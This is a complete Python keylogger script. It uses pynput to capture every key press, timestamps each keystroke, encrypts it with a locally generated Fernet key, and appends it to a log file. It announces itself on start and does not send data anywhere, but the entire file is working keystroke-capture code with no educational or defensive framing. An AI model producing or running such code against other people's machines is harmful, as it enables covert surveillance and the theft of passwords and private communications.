from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import os

key_file = "key.key"
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
else:
    with open(key_file, "rb") as f:
        key = f.read()

cipher = Fernet(key)
log_file = "logs/encrypted_log.txt"

def encrypt_and_save(log_data):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    message = timestamp + log_data
    encrypted = cipher.encrypt(message.encode())
    with open(log_file, "ab") as f:
        f.write(encrypted + b"\n")

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    encrypt_and_save(k)

def main():
    print("Keylogger started. Logs are encrypted.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if not os.path.exists("logs"):
        os.makedirs("logs")
    main()